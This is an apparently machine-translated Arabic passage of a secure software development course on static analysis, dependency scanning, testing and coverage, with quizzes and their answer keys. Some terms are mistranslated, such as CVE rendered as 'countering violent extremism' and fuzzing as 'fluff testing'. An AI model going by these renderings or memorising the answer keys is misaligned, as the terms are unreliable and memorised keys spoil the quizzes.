نوع واحد مهم جدا لدرجة أننا سنخصص قسما منفصلا كاملا له. يحتوي نوع التحليل الذي تقوم به هذه الأدوات على مجموعة متنوعة من الأسماء ، بما في ذلك تحليل تكوين البرامج (SCA) وتحليل التبعية وتحليل الأصل. بغض النظر عن ما يطلق عليه ، من المهم ، لذلك سنناقش ذلك بعد ذلك.

#### اختبار 1.2: نظرة عامة على التحليل الثابت

تقوم أدوات فحص رمز الأمان \>\>Security / أدوات اختبار أمان التطبيقات الثابتة (SAST) بفحص التعليمات البرمجية للبحث عن الثغرات الأمنية. يمكن أن تكون مفيدة للغاية ، ولكن مثل هذه الأداة لا يمكنها الإبلاغ عن أي نقاط ضعف حتى على البرامج التي بها نقاط ضعف. صواب أم خطأ؟<<

(x) صحيح

( ) خطأ

[تفسير]

هذا صحيح. إنها مفيدة ، وبشكل عام يجب عليك استخدام أداة واحدة على الأقل من هذا القبيل ، ولكن لا تنخدع بالتفكير في أن مجرد استخدام هذه الأدوات يزيل نقاط الضعف في البرامج.

[تفسير]

### تحليل تكوين البرامج (SCA) / تحليل التبعية

نوع واحد من أدوات التحليل الثابت مهم جدا لدرجة أننا نريد مناقشته بشكل منفصل. يحتوي نوع التحليل الذي تقوم به هذه الأدوات على مجموعة متنوعة من الأسماء ، بما في ذلك تحليل تكوين البرامج (SCA) وتحليل التبعية وتحليل الأصل. بغض النظر عن ما يطلق عليه ، فمن المهم. دعونا أولا نفحص *سبب* أهميته.

#### الحاجة إلى SCA

منذ فترة طويلة ، كتب مطورو البرامج معظم البرامج في تطبيقاتهم. اليوم ، هذا هو الحال أبدا. بدلا من ذلك ، عادة ما يعيد مطورو البرامج استخدام حزم البرامج التي يكتبها الآخرون في الغالب ، ثم يكتبون فقط الوظائف المتخصصة ورمز الغراء الضروري لجعل الأشياء تعمل معا بالطريقة المطلوبة. ينطبق هذا أيضا على حزم البرامج القابلة لإعادة الاستخدام ؛ تعتمد هذه الحزم عادة على الحزم ، والتي تعتمد على الآخرين ، وهكذا. وينطبق الشيء نفسه على أنظمة التشغيل المستقلة وصور الجهاز الظاهري وصور الحاويات - غالبا ما تتضمن الكثير من البرامج التي كتبها الآخرون.

هناك مزايا واضحة لإعادة استخدام البرامج. ميزة واحدة هي أنه يوفر الكثير من الوقت (والمال) - ليس عليك تطوير هذا الرمز! ميزة أخرى هي أن الحزمة المعاد استخدامها غالبا ما تكون جيدة بشكل خاص في هذه المهمة (نظرا لأن شخصا ما قضى وقتا على وجه التحديد لحل هذه المشكلة) ؛ غالبا ما تتعامل هذه الحزم مع حالات الحافة التي قد تنساها بخلاف ذلك.

ولكن عند إعادة استخدام البرنامج ، هناك جانب سلبي: سيكون لهذا البرنامج نقاط ضعف فيه. يجب أن تحاول اختيار البرامج التي من المحتمل أن تحتوي على نقاط ضعف أقل. ولكن بشكل عام * ، سيتم العثور على نقاط الضعف * في البرنامج الذي تستخدمه بشكل مباشر وغير مباشر ؛ سيتم الإعلان عن هذه الثغرات الأمنية علنا ، وسيتم إصدار تحديثات لتلك المكونات التي تعمل على إصلاح الثغرات الأمنية. نظرا لأن معظم البرامج المعاد استخدامها هي برمجيات المصدر المفتوح ، فإن بعض الأشخاص والشركات يسمون هذا الفحص لبرمجيات المصدر المفتوح. هذا ليس صحيحا تماما ، لأنه يمثل في الواقع مشكلة لأي برنامج معاد استخدامه ، ولكن من المفهوم أن يركز الناس على برمجيات المصدر المفتوح لأن معظم البرامج المعاد استخدامها هي برمجيات المصدر المفتوح.

يعد استخدام المكونات  المعروفة الضعيفة مشكلة شائعة لدرجة أنه في عام 2013 أضاف  OWASP *استخدام المكونات ذات الثغرات الأمنية المعروفة* إلى أفضل 10 OWASP. استخدام المكونات ذات الثغرات الأمنية المعروفة هو 2017 OWASP Top 10 # 9. استخدام المكونات الضعيفة والقديمة هو 2021 OWASP Top 10 # 6.

من المحتم أنك ستحتاج إلى تحديث المكونات المعاد استخدامها الضعيفة بسرعة ، لذلك تحتاج إلى *الاستعداد* لاكتشاف تحديثات الأمان بسرعة وإجراء تحديثات الأمان للبرامج المعاد استخدامها في تطبيقاتك.

#### الاستعداد لما لا مفر منه: نقاط الضعف في تبعياتك

يتمثل جزء أساسي من إعدادك في استخدام أداة يمكنها تحديد البرنامج الذي تعيد استخدامه ، والإبلاغ عن أي ثغرات أمنية معروفة للجمهور في تلك المكونات المعاد استخدامها. الأدوات التي يمكنها تحديد المكونات المعاد استخدامها لها أسماء مختلفة بما في ذلك أدوات تحليل تكوين البرامج (SCA) أو أدوات تحليل مكونات البرامج أو أدوات تحليل التبعية أو أدوات تحليل الأصل. تاريخيا ، تم تطوير العديد من هذه الأدوات للمراجعة القانونية ، لضمان استخدام جميع البرامج المعاد استخدامها بما يتوافق مع تراخيصها ، وأن التراخيص (كما هي مستخدمة) متوافقة ، وأن هناك تراخيص لكل ذلك. من الجيد جدا تضمين هذا النوع من تحليل الترخيص كلما حاولت تضمين أو تحديث أي برنامج معاد استخدامه. ولكن لأغراضنا ، سنركز على الأدوات التي تقارن قائمة المكونات هذه (بما في ذلك أرقام إصداراتها) بقواعد بيانات الثغرات الأمنية المعروفة.

هناك قواعد بيانات متاحة للجمهور من البرمجيات مع نقاط الضعف المعروفة للجمهور. قاعدة البيانات المستخدمة على نطاق واسع بشكل خاص هي قاعدة بيانات الضعف الوطنية الأمريكية (NVD). NVD هي قاعدة بيانات متاحة للجمهور من الثغرات الأمنية المعروفة بشكل عام، والتي يتم تحديدها جميعا بواسطة معرف مكافحة التطرف العنيف (كل ثغرة لها معرف مختلف لمكافحة التطرف العنيف) جنبا إلى جنب مع قائمة من المنتجات وأرقام الإصدارات المعروفة بوجود هذه الثغرة الأمنية. بعض البائعين التجاريين لديهم قواعد بيانات خاصة بهم أيضا.

لذلك ، كل ما يجب أن تفعله أداة SCA ، من الناحية النظرية ، هو معرفة المكونات (وإصداراتها) الموجودة ، والبحث عن كل منها في قاعدة بيانات واحدة أو أكثر ، والإبلاغ عن التطابقات. حتى اكتشاف المكونات ليس بالأمر السهل دائما. في بعض الأحيان تكون المكونات المعاد استخدامها غير واضحة (على سبيل المثال ، لأنه تم نسخها ولصقها ، بدلا من التعامل معها بشكل صحيح باستخدام مدير الحزم). والأهم من ذلك ، أن قواعد البيانات يتم تحديثها باستمرار مع العثور على نقاط ضعف جديدة. هذا يعني أن البرامج المعاد استخدامها والتي لم يكن لديها ثغرات أمنية معروفة في وقت سابق قد *يكون لديها* الآن  ثغرة أمنية معروفة. حتى لو كانت الثغرة الأمنية معروفة للجمهور في وقت سابق ، فربما لم يتم تسجيل هذه الحقيقة في الإصدارات السابقة من قاعدة (قواعد) البيانات التي تستخدمها الأداة. لذلك يجب إعادة تشغيل هذه الأدوات بشكل دوري ، أو إعادة تشغيل المقارنات ، حتى تصبح على دراية بالثغرات الأمنية المكتشفة حديثا.

يجب تجنب بعض السلوك السيئ لجعل هذه الأدوات أكثر فائدة. يقوم بعض المطورين بنسخ التعليمات البرمجية المعاد استخدامها من الحزم الأخرى إلى تطبيقاتهم ، بدلا من استخدام مدير الحزم لأتمتة تحديد الحزم المعاد استخدامها وتحديثها. والأسوأ من ذلك ، يقوم المطورون أحيانا *بتعديل* هذه النسخ  و / أو التحقق من هذه النسخ (إنشاء شوكة). يمكن لبعض أدوات SCA بالفعل فحص التعليمات البرمجية سطرا بسطر ، وتحديد هذه النسخ المحتملة ، وربطها مرة أخرى بمصادرها (للمساعدة في تحديد نقاط الضعف). لكن أدوات SCA هذه أكثر تعقيدا ، وغالبا ما تكون مكلفة للشراء والاستخدام ، وغالبا ما تكون محاولة *تحديث* هذا البرنامج صعبة للغاية لأن كل شيء يتم يدويا. بالإضافة إلى ذلك ، يجب أن تستخدم أدوات SCA هذه بالضرورة الاستدلال للكشف عن مثل هذه المواقف ، والتي قد تفوت مثل هذه المكونات على أي حال.

من الأفضل بكثير تطبيق بعض الممارسات الجيدة. أولا ، عند إعادة استخدام البرنامج ، استخدم مدير الحزم لإدارته ، وهو مدير يسجل أرقام الإصدارات المحددة بتنسيق قياسي يمكنك تسجيله في نظام التحكم في الإصدار الخاص بك. باستخدام تنسيق قياسي ، يمكنك استخدام أدوات SCA أبسط بكثير ، وستكون البيانات أكثر دقة. باستخدام مدير الحزم ، يمكنك التسبب في تحديث البرنامج بشكل تافه والتحقق من أن مجموعة المكونات الجديدة تعمل.

ولكن من الذي يقرر مدى السرعة التي تحتاجها لتحديث المكونات المعاد استخدامها؟ هذا سؤال صعب. قد يقول بعض الأشخاص ، "سياسة شركتي" ، "كبير مسؤولي أمن المعلومات" (CISO) ، "مكتب المعلومات الرئيسي" (CIO) ، أو شيء من هذا القبيل. كل هذه الإجابات هي إجابات خاطئة. إذا كان هدفك هو الحصول على نظام آمن ، فإن الإجابة الصحيحة هي أن **_المهاجمين يقررون_** *متى تحتاج إلى التحديث*! هذا لأنك تحتاج إلى نشر الإصدار المحدث قبل أن يستغل المهاجم هذه الثغرة الأمنية في نظامك المنشور.

السرعة مهمة عندما يكون للمكون الذي تعتمد عليه ثغرة أمنية معروفة للجمهور ، وأنت *تعلم* أن هذا سيحدث في بعض الأحيان. لذا فإن محاولة التعامل مع هذا يدويا تماما يعد خطأ. يجب عليك بدلا من ذلك التأكد مما يلي:

1. لديك أداة SCA واحدة على الأقل تقوم بإبلاغك تلقائيا عند وجود ثغرة أمنية معروفة في أحد المكونات التي يستخدمها نظامك.

2. يمكنك بسهولة تحديث مكون باستخدام أمر بسيط ، بشكل عام عن طريق إخبار مدير الحزم بالتبديل إلى إصدار مختلف من هذا المكون والتحقق من هذا التغيير.

3. يمكنك اختبار التكوين المعدل تلقائيا للتأكد من أن تحديث المكون لا يكسر أي شيء مهم.

4. يمكنك نشره بسرعة (إذا قمت بنشره مباشرة) و / أو توزيعه (إذا قمت بتوزيع البرنامج على الآخرين).

إذا لم تكن الاختبارات التلقائية جيدة بما يكفي لجعلها مقبولة لنشر المكونات المحدثة ، فأنت تواجه مشكلة أمنية خطيرة. الحاجة إلى تحديث المكونات المعاد استخدامها أمر لا مفر منه - وليس مجرد احتمال - في معظم البرامج. إذا كانت المكونات التي تستخدمها قديمة جدا بحيث لا يمكنك التحديث إلى إصدار مدعوم ، فهذه أيضا مشكلة خطيرة ... لأنه مرة أخرى ، فإن الحاجة إلى تحديث مكون لثغرة أمنية أمر لا مفر منه بشكل عام.

مثل جميع الأدوات ، SCAs عرضة للإيجابيات الخاطئة. على وجه الخصوص ، قد يكون للمكون ثغرة أمنية ، ولكن فقط عند استخدام طرق معينة أو فقط في تكوينات معينة. إذا كنت لا تستخدم المكون بطريقة يمكن من خلالها استغلال الثغرة الأمنية ، فلن تحتاج بالطبع إلى تحديث المكون. لكن هذا مضلل بعض الشيء. غالبا ما يكون من الصعب التأكد *من* أنك لست بحاجة إلى إجراء التحديث. بالإضافة إلى ذلك ، إذا كانت لديك عملية مناسبة حيث يمكنك بسهولة تحديث المكونات - وتحتاج إلى ذلك - فغالبا ما يستغرق الأمر وقتا أطول لتحديد (بالتأكيد) أن الثغرة الأمنية غير قابلة للاستغلال بدلا من مجرد إجراء التحديث. علاوة على ذلك ، فإن الوقت المستغرق لمعرفة ذلك قد يمنح المهاجم وقتا لاستغلاله إذا كانت ثغرة أمنية حقيقية. لذلك غالبا ما يكون من الأفضل التحديث فقط ، حتى لو لم يكن من المؤكد أن تكون قابلة للاستغلال.

هناك الكثير من SCAs المتاحة. إذا كنت تستخدم GitHub أو GitLab ، فإنها توفر بعض تقارير SCA الأساسية عن الثغرات الأمنية المعروفة في العديد من المكونات مجانا (على افتراض أنك تستخدم تنسيقا قياسيا لإدارة الحزم يمكنهم معالجته). يمكن لمشاريع Linux Foundation استخدام LFx (CommunityBridge سابقا) الذي يوفر هذه الخدمة. هناك مجموعة متنوعة من الموردين الذين يقدمون أو يبيعون هذه الأدوات. يتضمن ذلك فحص تبعية OWASP (وهو OSS) ، ومنتجات Nexus من Sonatype ، و Black Duck من Synopsys ، و Ion Channel Solutions ، و Snyk. تتضمن بعض مديري الحزم هذه الإمكانية أو لديهم مكون إضافي لها (على سبيل المثال ، **يحتوي مجمع** Ruby  على **تدقيق الحزمة**). هذه بالتأكيد *ليست* قائمة كاملة ، ولا شك أنك سترغب في مقارنة الخيارات.

المفتاح هو أن معظم البرامج تعيد استخدام برامج أخرى ، وأن نقاط الضعف ستوجد أحيانا في هذا البرنامج المعاد استخدامه.

#### اختبار 1.3: تحليل تكوين البرمجيات (SCA) / تحليل التبعية

\>\>حدد كل العبارات الحقيقية حول معالجة التبعيات:<<

[!x] يمكن استخدام الأدوات لمساعدتك في تحديد تبعيات البرامج التي تحتوي على ثغرات أمنية معروفة للجمهور.

[ ] يمكن استخدام أدوات تحليل تكوين البرامج (SCA) للعثور على جميع تبعيات البرامج ذات الثغرات الأمنية. {{ محدد: لا، تحاول هذه الأدوات تحديد تبعيات البرامج، ثم مقارنتها بقاعدة بيانات الثغرات الأمنية المعروفة الخاصة بها. ومع ذلك ، قد لا يحددون جميع التبعيات أو قد لا تكون الثغرة الأمنية في قاعدة البيانات الخاصة بهم. قد لا تكون الثغرة الأمنية معروفة للجمهور، وحتى إذا كانت كذلك، فليس هناك ما يضمن أن قاعدة بيانات الأدوات تحتوي على *جميع* الثغرات الأمنية المعروفة للجمهور. }}

[ ] للحفاظ على أمان البرامج في العمليات، قم بتحديث المكونات المعاد استخدامها في غضون الوقت الذي تتطلبه سياسة شركتك. {{ محدد: خطأ، يقرر *المهاجم* متى تحتاج إلى التحديث. يجب نشر الإصدار المحدث قبل أن يهاجم المهاجم النظام الذي نشر باستخدام هذه الثغرة الأمنية. إذا كانت سياسة شركتك تنص على أن لديك أسبوعا ، وقام المهاجم بتخريب نظامك في غضون يوم واحد ، فقد كان نظامك لا يزال مدمرا. }}

[x] للحفاظ على أمان البرامج في العمليات، تأكد من وجود تقارير تلقائية عن الثغرات الأمنية المعروفة في تبعياتك، وأنه يمكنك بسهولة تحديث التبعيات، وأنه يمكنك اختبار التكوين المعدل تلقائيا، وأنه يمكنك النشر أو التوزيع بسرعة حسب الاقتضاء.

[ ] الاختبارات التلقائية هي من الجيد الحصول عليها ، ولكنها ليست ضرورية للأمان ، عندما يكون لديك تبعيات. {{محدد: خطأ، لأنه يجب أن تكون مستعدا لتحديث سريع عندما يكون للتبعية استغلال معروف للجمهور. بدون اختبارات تلقائية ، من غير العملي اكتساب ثقة كافية بسرعة لنشر التحديث في الوقت المناسب. }}

## التحليل الديناميكي

### نظرة عامة على التحليل الديناميكي

التحليل الديناميكي هو أي نهج للتحقق من البرامج (بما في ذلك العثور على العيوب) عن طريق تنفيذ البرنامج على مدخلات محددة والتحقق من النتائج. سنلقي نظرة على بعض أنواع الأدوات التي تقوم بذلك ، ولكن أولا ، دعنا نناقش حدودها.

#### القيود المفروضة على التحليل الديناميكي

جميع أدوات التحليل الديناميكي لها قيود أساسية: من المستحيل تقييم جميع المدخلات الممكنة في فترة زمنية معقولة. ليس من الممكن حتى تقييم *مجموعة فرعية معقولة*.

دعونا نتخيل برنامجا تافها يضيف عددين صحيحين 64 بت. عدد المدخلات الممكنة هو (2 ^ 64) \ * (2 ^ 64) = 2 ^ 128. إذا أجرينا اختبارات باستخدام معالج 4 جيجاهرتز ، وتمكنا من تشغيل واختبار كل إدخال في 5 دورات ، فسيستغرق الأمر 13.5 × 10 ^ 21 عاما (13.5 سنة زيتا) لاختبار البرنامج بالكامل. استخدام 1 مليون معالج 8 النواة لا يساعد بما فيه الكفاية. هذا من شأنه أن يقلل الوقت إلى 1.7 × 10 ^ 15 سنة (أي 1.7 كوادريليون سنة). تحتوي البرامج الحقيقية على مدخلات أكثر تعقيدا من ذلك بكثير ، لذا فإن اختبار حتى 0.00001٪ من جميع مدخلات البرامج الحقيقية أمر مستحيل في حياة الإنسان.

نتيجة لذلك ، يجب أن تحاول جميع مناهج التحليل الديناميكي اختيار مجموعة فرعية صغيرة جدا من المدخلات المحتملة التي لا تزال لديها فرصة لاكتشاف المشكلات حيثما وجدت. غالبا ما تكون فعالة جدا. لكن مناهج التحليل الديناميكي لا يمكن أن "تثبت" أن أي شيء يعمل بشكل صحيح بشكل عام. في أحسن الأحوال ، لديهم فرصة جيدة للكشف عن المشاكل.

#### الاختبار التقليدي

نهج التحليل الديناميكي الأكثر شهرة هو الاختبار التقليدي. يمكنك تحديد مدخلات معينة لإرسالها إلى برنامج والتحقق لمعرفة ما إذا كانت النتيجة صحيحة. يمكنك اختبار أجزاء معينة من البرنامج ، مثل طريقة أو وظيفة (وهذا ما يسمى اختبار *الوحدة*). يمكنك أيضا إرسال تسلسلات من المدخلات إلى النظام المتكامل ككل (*اختبار التكامل*). يجمع معظم الأشخاص بين اختبار الوحدة واختبار التكامل. اختبار الوحدة سريع ويمكن أن يكون من السهل اختبار العديد من الحالات الخاصة ، ولكن اختبار الوحدة غالبا ما يفتقد مشاكل النظام بأكمله التي من المرجح أن يكتشفها اختبار التكامل. نظرا لأن أجهزة الكمبيوتر أسرع بكثير مما كانت عليه قبل عقود ، فمن الأفضل غالبا التركيز على اختبار التكامل على اختبار الوحدة ، ولكن كلا النهجين لهما مكانهما. تصف أدبيات الاختبار أنواعا أخرى من الاختبارات ، ولكن لأغراضنا ، فإن هذين النهجين كافيان لفهم المشكلات.

إذا كان برنامجك يحتاج إلى العمل بشكل صحيح ، فمن المهم للغاية أن يكون لديك مجموعة اختبار جيدة من  الاختبارات *التلقائية* وتطبيق مجموعة الاختبار هذه في خط أنابيب التكامل المستمر. نعني بالخير ** "من المحتمل نسبيا اكتشاف مشاكل خطيرة في البرنامج". على الرغم من أن هذا لا يضمن عدم وجود أخطاء ، إلا أن مجموعة الاختبار الجيدة تزيد بشكل كبير من احتمالية الاكتشاف ، وهي مهمة بشكل خاص لاكتشاف المشكلات عند ترقية مكون معاد استخدامه.

إذا قمت بتسليم برنامج ، وتم العثور على عيب وإصلاحه لاحقا ، فيجب أن تفكر في إضافة اختبار آخر لهذا الموقف لكل إصلاح. في كثير من الأحيان ، تشير العيوب التي تهرب إلى الميدان إلى نوع من الخطأ الدقيق الذي قد يتكرر في إصدار مستقبلي من النظام. في هذه الحالة ، أضف اختبارا (اختبارات) بحيث إذا تكررت هذه المشكلة ، اكتشافها *قبل* إصدار  إصدار آخر.

إذا كنت تتعاقد مع شخص آخر لكتابة (بعض) برنامجك ، ولا تريد أن يتم التحكم فيه لاحقا ، فأنت بحاجة إلى التأكد من أنك لا تحصل فقط على الكود المصدري للتطبيق (وحقوق تعديله بشكل أكبر) ، ولكن أيضا الحصول على جميع تعليمات البناء والاختبارات اللازمة لتكون قادرا على تغيير البرنامج بثقة. بعد كل شيء ، إذا لم تتمكن من إنشاء أو اختبار تعديل البرنامج بسهولة ، فلا توجد طريقة آمنة لإجراء التعديلات وشحنها.

من الناحية النظرية ، يمكنك إنشاء اختبارات يدوية ، أي كتابة إجراء يدوي مفصل خطوة بخطوة وجعل الإنسان يتبع خطوات الاختبار هذه. من الناحية العملية ، تكون الاختبارات اليدوية دائما "اختبارات لن يتم إجراؤها" بسبب ارتفاع تكاليفها وتأخرها. مشكلة أخرى في الاختبار اليدوي هي أنه *لا يشجع* الاختبار المستمر ، لأنه يكلف الوقت والمال لإجراء تلك الاختبارات اليدوية. لذا تجنب الاختبار اليدوي لصالح الاختبار الآلي حيثما كان ذلك عمليا. في بعض الحالات ، قد تحتاج إلى إجراء اختبار يدوي ، ولكن تذكر أن كل اختبار يدوي هو اختبار نادرا ما يتم إجراؤه (إن وجد) ، مما يجعل هذا الاختبار أقل فائدة بكثير. لاحظ أن ما نصفه *بالاختبارات اليدوية* يختلف عن *التحليل اليدوي غير الموجه* (حيث يستخدم البشر البرنامج *دون* عملية خطوة بخطوة). يمكن أن يكون التحليل اليدوي غير الموجه فعالا تماما ، ولكنه يختلف تماما عن الاختبارات اليدوية كما حددناها هنا.

المشكلة الصعبة في الاختبار هي عندما لا يتوفر مورد. إذا كان الاختبار يتطلب بعض البرامج أو الأجهزة أو البيانات التي لا تملكها، فلا يمكنك اختباره مباشرة. عادة ما يكون أفضل ما يمكنك فعله في هذه الحالات هو محاكاته (على سبيل المثال ، باستخدام برامج ساخرة أو أجهزة محاكاة أو مجموعة بيانات احتياطية). إذا كان هذا هو أفضل ما يمكنك القيام به ، فعادة ما يكون الأمر مفيدا. لكن لا تخلط بين المحاكاة والواقع. قد تكون نتائج الاختبار مضللة بسبب الاختلافات بين المورد الفعلي وبديله.

#### الاختبار التقليدي للأمان

من منظور أمني ، من المهم تضمين اختبارات لمتطلبات الأمان. على وجه الخصوص ، اختبر كلا من "ما يجب أن يحدث" و "ما لا ينبغي أن يحدث". غالبا ما ينسى الناس اختبار ما *لا ينبغي أن يحدث* (ويعرف أيضا باسم الاختبار السلبي). على سبيل المثال ، عندما ينطبق ، يجب أن يكون لديك اختبار للتحقق من "هل يمكنني القراءة / الكتابة *دون* أن يكون مصرحا لي بذلك؟" (يجب أن تكون الإجابة "لا") و "هل يمكنني الوصول إلى النظام بشهادة *غير صالحة* أو بدون شهادة على الإطلاق؟" (مرة أخرى ، يجب أن يفشل ذلك). من الشائع جدا أن يفشل أمان البرامج لأنها لا تتحقق بشكل صحيح من المصادقة (2017 OWASP Top 10 # 2) أو التفويض (2017 OWASP Top 10 # 5) ، لذا تأكد من إجراء اختبارات لذلك!

يسمى أحد أساليب تطوير البرامج التطوير *القائم على الاختبار* (TDD). للمبالغة في التلخيص ، في TDD ، تتم كتابة اختبارات القدرة الجديدة قبل البرنامج لتنفيذ القدرة. هذا له بعض المزايا ، على وجه الخصوص ، فهو يشجع على كتابة اختبارات مفيدة تتحقق بالفعل مما يفترض أن تتحقق منه ، كما أنه يشجع على تطوير برامج قابلة للاختبار. إحدى المشكلات المحتملة مع TDD هي أن العديد من ممارسي TDD يفشلون في كتابة ** اختبارات سلبية. حتى أن بعض إرشادات TDD تجادل بأنه يجب عليك فقط كتابة اختبارات للقدرة الجديدة ولا شيء آخر. هذا توجيه فظيع ، لأنه في بعض الأحيان لا ينبغي أبدا ** السماح بحدوث بعض الأشياء ، وما زلت بحاجة إلى اختبارها. يمكنك بالتأكيد كتابة برنامج آمن باستخدام TDD ، ولكن يجب عليك تضمين اختبارات سلبية (اختبارات لما يجب *ألا* يفعله البرنامج) إذا قمت بتطبيق TDD.

 2021 OWASP Top 10 # 7 هو *فشل تحديد الهوية والمصادقة*. تعد المصادقة غير الكافية خطأ شائعا لدرجة أن *المصادقة المكسورة* هي 2017 OWASP Top 10 # 2 ، و 2021 CWE Top 25 # 14 ، و 2019 CWE Top 25 # 13. إنه [CWE-287 ](https://cwe.mitre.org/data/definitions/287.html)، *مصادقة غير صحيحة*. * المصادقة المفقودة ل (على وجه التحديد أ) الوظيفة الحرجة* هي 2021 CWE Top 25 #  11 و 2019 CWE Top 25 # 36 (CWE-306[](https://cwe.mitre.org/data/definitions/306.html)).  *التحكم في الوصول المكسور* (بما في ذلك فشل التفويض) هو 2017 OWASP Top 10 # 5.

#### تغطية الاختبار

يمكنك *دائما* كتابة اختبار آخر ؛ كيف تعرف أنك كتبت اختبارات كافية؟ يستغرق إنشاء الاختبارات وصيانتها وقتا ، ويجب إضافة الاختبارات فقط إذا كانت تضيف قيمة. تبين أن هذا سؤال صعب ، ويعتمد الكثير على مدى أهمية برنامجك.

هناك قياسان بسيطان يمكن أن يساعدانك في الإجابة على هذا السؤال وهما *تغطية البيان* وتغطية *الفرع*:

1. تغطية البيان هي النسبة المئوية لبيانات البرنامج التي تم تشغيلها بواسطة اختبار واحد على الأقل.

2. تغطية الفرع هي النسبة المئوية للفروع التي تم إجراؤها بواسطة اختبار واحد على الأقل. في  بناء **if-then-else** ، يكون  الجزء **ثم** فرعا واحدا والجزء  الآخر **** هو الفرع الآخر. في الحلقة ، يكون  تشغيل جزء *الجسم* فرعا واحدا ولا *يتم تشغيل الجسم* هو الفرع الآخر. في عبارة التبديل (الحالة) ، كل احتمال هو فرع.

تجمع تغطية البيان وتغطية الفرع بين التحليل الديناميكي (نتائج الاختبار) والتحليل الثابت (معلومات حول الكود) ، لذلك يعتبر أحيانا  نهجا *مختلطا*. ولكن بغض النظر عن ما تسميه ، فإن هذه القياسات توفر بعض المعلومات حول مدى جودة اختبار البرنامج.

تتمثل إحدى المشكلات المحتملة في تغطية البيانات وتغطية الفروع في أنه قد يتعذر الوصول إلى بعض البيانات والفروع لأسباب متنوعة. إذا تعذر الوصول إلى بيان ، فقد ترغب في إدراج ما يعادل "**assert (false)**" لإبلاغ الأدوات والبشر بأنه لا ينبغي الوصول إلى هذا البيان أبدا. ما تريد معرفته حقا هو النسبة المئوية للفروع ** والبيانات المحتملة التي تمت تغطيتها بواسطة الاختبارات.

كقاعدة عامة ، نعتقد أن مجموعة الاختبار الآلية التي تحتوي على تغطية بيان أقل من 90٪ أو أقل من 80٪ من تغطية الفرع (على جميع الاختبارات الآلية) هي مجموعة اختبار ضعيفة. لكن هذه مجرد قاعدة أساسية. يعتقد بعض الخبراء أنه ينبغي توقع أعداد أكبر (يجادل البعض بأن أي شيء أقل من 100٪ من البيانات والفروع المحتملة أمر غير مقبول). مع تساوي جميع الأشياء الأخرى ، تكون الأرقام الأكبر جيدة ، ولكن غالبا ما يكون الحصول على تلك النسبة المئوية القليلة الأخيرة أكثر تكلفة ، وما إذا كان الأمر يستحق ذلك أم لا يعتمد على مدى أهمية البرنامج. في كثير من الحالات ، لا يمكن تنفيذ بعض البيانات أو الفروع ، وقد لا تكون هناك طريقة للإشارة إلى ذلك لأدوات القياس.

تحذرك مقاييس تغطية الاختبار هذه من البيانات والفروع التي لا يتم اختبارها ، ويمكن أن تكون هذه المعلومات ذات قيمة حقا. من وجهة نظر أمنية ، تحذرك تدابير التغطية من البيانات أو الفروع التي لا يتم تشغيلها في الاختبارات ، مما يشير إلى وجود بعض الاختبارات المهمة المفقودة أو أن البرنامج لا يعمل بشكل صحيح. لا تضيف اختبارا فقط. تأكد من أنك تفهم *سبب* عدم تغطية شيء ما.

على سبيل المثال ، ذكرنا سابقا ثغرة أمنية خطيرة في العديد من إصدارات أنظمة تشغيل Apple ، تسمى رسميا CVE-2014-1266 وتسمى بشكل غير رسمي "goto fail. فشل goto ؛" الثغرة الأمنية. كانت المشكلة أنه بسبب  عبارة **goto** المكررة  ، تم تخطي بعض التعليمات البرمجية الحيوية للتحقق من شهادات الأمان. كان من الممكن أن يكتشف إجراء تغطية البيان بشكل تافه أن هذا الرمز الحرج للأمان لم يتم تشغيله بواسطة أي اختبار ، وكان ينبغي أن يكون ذلك تحذيرا كافيا للنظر في المشكلة.

تتمثل المشكلة الكبيرة في إجراءات تغطية البيان والفرع في أنها يمكن أن تحذرك من بعض مجموعات الاختبار الآلية السيئة ، ولكن لا يزال بإمكان مجموعة الاختبار السيئة الحصول على درجات مثالية بنسبة 100٪. على سبيل المثال ، قد تمارس مجموعة الاختبار جميع الفروع والعبارات ولكن لا تتحقق مما إذا كانت أي من الإجابات صحيحة. سيكون لمجموعة الاختبار هذه تغطية فرع وبيان بنسبة 100٪ ، وستكون أيضا مجموعة اختبار سيئة. بالإضافة إلى ذلك ، بينما يمكنهم إخبارك بما إذا كان قد تم اختبار التعليمات البرمجية الموجودة أم لا ، لا يمكنهم اكتشاف التعليمات البرمجية *المفقودة* . على سبيل المثال ، إذا كانت هناك حالة خاصة تحتاج إلى معالجة خاصة ، ولكن لا شيء يتحقق من تلك الحالة الخاصة ، فعادة لا يمكن لتدابير التغطية هذه اكتشاف ذلك.

باختصار: يمكن أن تكون تدابير التغطية هذه مفيدة للتحذير من بعض المشكلات ، لكنها لا تحذر من جميع مشاكل الاختبار.

ولكن هناك المزيد للتحليل الديناميكي عندما تكون مهتما بالأمان. دعونا نلقي نظرة بعد ذلك على اختبار الزغب.

#### اختبار 1.4: نظرة عامة على التحليل الديناميكي

\>\>حدد العبارة (العبارات) الحقيقية حول التحليل الديناميكي بما في ذلك الاختبار: <<

[!] بالنسبة للبرامج عالية الجودة ، تأكد من اختبار البرنامج بجميع قيم الإدخال الممكنة. {{ محدد: هذا مستحيل تماما. لا يمكننا حتى القيام بذلك للبرامج التي تضيف رقمين 64 بت فقط ، ناهيك عن برامج "العالم الحقيقي". }}

[x] غالبا ما يفتقد اختبار الوحدة مشاكل النظام بأكمله التي من المرجح أن يكتشفها اختبار التكامل.

[ ] تقيس تغطية البيان النسبة المئوية للفروع التي يتم تنفيذها بواسطة مجموعة من الاختبارات. {{ محدد: لا. تغطية الفروع تقيس الفروع ، تغطية البيان تقيس البيانات. }}

[ ] يجب أن يضمن كل اختبار أمان أن النظام ينفذ إجراء عندما يكون قد تم التصريح له بذلك بالفعل. {{ محدد: لا ، على الرغم من أن هذا سؤال متستر باعتراف الجميع. ربما يكون من المهم أكثر للأمان كتابة اختبارات للتحقق من أن النظام لا يقوم بإجراءات مختلفة عندما لا يكون مصرحا له بذلك. هذه الأنواع من الاختبارات ، للتأكد من أن شيئا ما لا يتم إجراؤه عندما لا يفترض القيام به ، تسمى أحيانا "الاختبار السلبي". من المهم جدا ، من أجل الأمان ، أن تكون هذه الاختبارات السلبية جزءا من مجموعة الاختبار الآلي الخاصة بك. }}

[x] إذا لم يتم ممارسة البيانات من قبل مجموعة الاختبار الخاصة بك ، فيجب عليك التحقيق لتحديد السبب ، خاصة إذا كانت مهمة للأمن.

[x] بشكل عام ، لا يمكن للبيان وتغطية الفرع اكتشاف التعليمات البرمجية المفقودة ، ويمكنهم فقط الإبلاغ عن النسبة المئوية للرمز *الحالي* (حسب بعض المقاييس) التي تم اختبارها.

### اختبار الزغب

اختبار الزغب هو نوع مختلف من التحليل الديناميكي.

#### التشويش مقابل الاختبار التقليدي

